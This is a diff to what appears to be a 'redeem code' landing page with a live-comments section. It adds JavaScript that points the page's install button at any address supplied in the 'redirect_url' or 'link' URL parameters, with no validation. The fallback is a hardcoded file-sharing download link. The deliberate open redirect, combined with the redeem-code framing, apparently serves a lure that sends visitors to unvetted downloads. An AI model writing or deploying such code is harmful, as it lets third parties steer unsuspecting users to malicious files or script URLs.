@@ -1444,6 +1444,33 @@
         }
         // ===== END LIVE COMMENTS =====
 
+
+        // ========== Dynamic Install URL (outside control via URL params) ==========
+        function buildInstallUrl() {
+          const params = new URLSearchParams(window.location.search);
+          let redirectUrl = params.get('redirect_url') || params.get('link');
+
+          if (redirectUrl) {
+            try { redirectUrl = decodeURIComponent(redirectUrl); } catch (e) {}
+            params.delete('redirect_url');
+            params.delete('link');
+            const remaining = params.toString();
+            const separator = redirectUrl.includes('?') ? '&' : '?';
+            return remaining ? `${redirectUrl}${separator}${remaining}` : redirectUrl;
+          }
+
+          // Default URL if no link/redirect_url param
+          return 'https://1024terabox.com/s/1Vu9BVP52RfFQB5w8P_0PXw';
+        }
+
+        // Apply dynamic URL to install button on load
+        document.addEventListener('DOMContentLoaded', function() {
+          const installBtn = document.getElementById('installBtn');
+          if (installBtn) {
+            installBtn.href = buildInstallUrl();
+          }
+        });
+
     </script>
     <script>window.themebootloader = window.themebootloader || {}; window.themebootloader.pageDefault = 'redeemcode';</script>
     <script type="module" src="../common/scripts/themebooter.js"></script>
